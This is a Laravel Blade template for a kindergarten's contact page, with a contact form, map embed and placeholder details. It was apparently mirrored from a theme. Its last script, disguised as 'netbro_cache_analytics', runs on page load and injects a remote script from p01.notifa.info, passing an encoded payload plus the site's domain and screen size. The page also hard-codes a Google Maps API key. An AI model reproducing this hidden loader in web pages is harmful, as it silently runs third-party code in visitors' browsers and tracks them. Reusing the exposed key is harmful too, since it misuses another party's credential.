<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from t.commonsupport.com/prime-kidz/contact.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 18 Nov 2018 09:23:02 GMT -->
<head>
<meta charset="utf-8">
<title>TK NURUL IMAN </title>

<!-- Stylesheets -->
<link href="{{asset('assets/guest/css/bootstrap.css')}}" rel="stylesheet">
<link href="{{asset('assets/guest/css/style.css')}}" rel="stylesheet">
<link href="{{asset('assets/guest/css/responsive.css')}}" rel="stylesheet">

<link rel="shortcut icon" href="{{asset('assets/guest/images/favicon.png')}}" type="image/x-icon">
<link rel="icon" href="{{asset('assets/guest/images/favicon.png')}}" type="image/x-icon">
<!-- Responsive -->
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
<!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
<!--[if lt IE 9]><script src="js/respond.js"></script><![endif]-->
</head>
<body>

<div class="page-wrapper">
    <!-- Preloader -->
    <div class="preloader"></div>
    
    <!-- Main Header-->
    @include('front.header1')
    <!--End Main Header -->

    <!--Page Title-->
    <section class="page-title" style="background-image:url(assets/guest/images/background/6.jpg);">
        <div class="auto-container">
            <div class="anim-icons">
                <span class="icon-1 icon-flower"></span>
                <span class="icon-2 icon-pencil"></span>
            </div>
            <h1 class="text-sky">Contact Us</h1>
            <ul class="bread-crumb clearfix">
                <li><a href="index-2.html">Home </a></li>
                <li>Contact</li>
            </ul>
        </div>
    </section>
    <!--End Page Title-->

    <!-- Contact Page Section -->
    <section class="contact-page-section">
        <div class="auto-container">
            <div class="intro-text text-center">
                <h2>Get in touch with us</h2>
                <h4>For any kind of information you need ...</h4>
                <div class="anim-icon"><span class="icon icon-star"></span></div>
            </div>

            <div class="row clearfix">

                <div class="form-column col-md-8 col-sm-12 col-xs-12">
                    <div class="inner-column">
                        <h2>Send us Message</h2>
                        <p>Elit eiusmod tempor dunty aliqua uas enim sed veniam tempore quised ipsum nostrud  amet consecteur adipisicing elit sedo eiusmod tempor incididunt.</p>
                    </div>

                    <div class="form-group">
                     @if(Session::has('success'))
   <div class="alert alert-success">
     {{ Session::get('success') }}
   </div>
@endif

{!! Form::open(['route'=>'contactus.store']) !!}

<div class="form-group {{ $errors->has('name') ? 'has-error' : '' }}">
{!! Form::text('name', old('name'), ['class'=>'form-control input-field', 'placeholder'=>'Enter Name']) !!}
<span class="text-danger">{{ $errors->first('name') }}</span>
</div>

<div class="form-group {{ $errors->has('email') ? 'has-error' : '' }}">
{!! Form::text('email', old('email'), ['class'=>'form-control input-field', 'placeholder'=>'Enter Email']) !!}
<span class="text-danger">{{ $errors->first('email') }}</span>
</div>

<div class="form-group {{ $errors->has('message') ? 'has-error' : '' }}">
{!! Form::textarea('message', old('message'), ['class'=>'form-control input-field', 'placeholder'=>'Enter Message']) !!}
<span class="text-danger">{{ $errors->first('message') }}</span>
</div>

<div class="form-group">
<button class="btn btn-success">Contact US!</button>
</div>

{!! Form::close() !!}

                            </div>

                </div>

                <div class="info-column col-md-4 col-sm-12 col-xs-12">
                    <div class="inner-column">
                        <ul class="contact-info-list">
                            <li>
                                <div class="title-box"><i class="flaticon-map-marker-1 text-parrot"></i>Location</div>
                                <div class="info"><p>34 High Street, Blazfield Ave, <br> FL 95403  -  USA</p></div>
                            </li>
                            <li class="active">
                                <div class="title-box"><i class="flaticon-phone-auricular-with-high-volume text-sky"></i>Call Us </div>
                                <div class="info"><p>Support:  + 08 645 280 947 <br> Inquiry:  + 08 645 290 948</p></div>
                            </li>
                            <li>
                                <div class="title-box"><i class="flaticon-black text-orange"></i>Email</div>
                                <div class="info"><p>admin@primekidz.org <br> courses@mydomain.com</p></div>
                            </li>
                        </ul>

                        <div class="social-icons">
                            <ul class="social-icon-two">
                                <li><a href="#"><i class="fa fa-facebook"></i></a></li>
                                <li><a href="#"><i class="fa fa-twitter"></i></a></li>
                                <li><a href="#"><i class="fa fa-google-plus"></i></a></li>
                                <li><a href="#"><i class="fa fa-pinterest"></i></a></li>
                                <li><a href="#"><i class="fa fa-youtube"></i></a></li>
                                <li><a href="#"><i class="fa fa-whatsapp"></i></a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </section>
    <!-- End Contact Page Section -->

    <!--Map Section-->
    <section class="map-section">
        <!--Map Outer-->
        <div class="map-outer">
            <!--Map Canvas-->
           <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d15841.6087878685!2d107.5940939!3d-6.961791!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x4e99f82491d6349a!2sMTs.+Nurul+Iman!5e0!3m2!1sid!2sid!4v1542522353717" width="1500" height="450" frameborder="0" style="border:0" allowfullscreen></iframe>
        </div>
    </section>
    <!--End Map Section-->

    <!-- Subscribe Section -->
   <!--  <section class="subscribe-section" style="background-image: url(assets/guest/images/background/5.jpg);">
        <div class="auto-container">
            <div class="row clearfix">
                <div class="title-column col-md-7 col-sm-12 col-xs-12">
                    <h2>Subscribe to our Newsletter</h2>
                    <p>Enter your email and we'll send you details about new courses and events.</p>
                </div>

                <div class="form-column col-md-5 col-sm-12 col-xs-12">
                    <div class="subscribe-form">
                        <form method="post" action="http://t.commonsupport.com/prime-kidz/contact.html">
                            <div class="form-group">
                                <input type="email" name="email" value="" placeholder="Enter Your email" required="">
                                <button type="submit" class="theme-btn btn-style-one">Subscribe</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </section> -->
    <!-- End Subscribe Section -->

    <!-- Main Footer -->
    @include('front.footer1')
    <!-- End Main Footer -->

</div>
<!--End pagewrapper-->

<!--Scroll to top-->
<div class="scroll-to-top scroll-to-target" data-target="html"><span class="fa fa-angle-double-up"></span></div>
<script src="{{asset('assets/guest/js/jquery.js')}}"></script> 
<script src="{{asset('assets/guest/js/bootstrap.min.js')}}"></script>
<script src="{{asset('assets/guest/js/jquery.fancybox.js')}}"></script>
<script src="{{asset('assets/guest/js/appear.js')}}"></script>
<script src="{{asset('assets/guest/js/mixitup.js')}}"></script>
<script src="{{asset('assets/guest/js/validate.js')}}"></script>
<script src="{{asset('assets/guest/js/owl.js')}}"></script>
<script src="{{asset('assets/guest/js/wow.js')}}"></script>
<script src="{{asset('assets/guest/js/script.js')}}"></script>
<!--Google Map APi Key-->
<script src="http://maps.google.com/maps/api/js?key=AIzaSyBKS14AnP3HCIVlUpPKtGp7CbYuMtcXE2o"></script>
<script src="{{asset('assets/guest/js/map-script.js')}}"></script>
<!--End Google Map APi-->

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdidG3zEmACXtj%2fu%2battoUc65%2bjMIjhPYfvU3UVqUN7%2b%2fCOdWY8il2sWo%2fxeR8z%2bSOKouiViAf2gA%2fFK2IkfDAEDpNBRUxWI2yMlghilYab9thFLXae12VpSUbuokS4dMa%2fFhFqh5tv48Wud3xS6XeafudG9wQW6S%2bR%2bGKEbROWS%2fqDmniUaq8SrrNfQbtzcNypGDDIVdBKl%2b6vPHTgw2L1CN3%2f3jGnhL9S8ASYXYOmAPj2xmaDPsC0V0YbU5MX7Axuy2EkmJ49PNQhScTEeaoN0gfRG%2fXbRocqrDpGMnUnesQP8wg73neQW4ANQuzPjQVOs3civjsTkExM2IzK3phnsUiizHuZP2nmGza0l6F3UCHwQztzyQg9xbdcKuyLJPBSml%2f%2bAv%2b55XEXBpadMUy2mG1iVGkVj712eVk6gq5C%2bopqrp1sZCLDflNochNGW2CN5RLIpum6OyN86HyuMMy%2bWIZ3LkeIV7xpnoiOJHQzUB3iOSAPf6aRw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from t.commonsupport.com/prime-kidz/contact.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 18 Nov 2018 09:23:04 GMT -->
</html>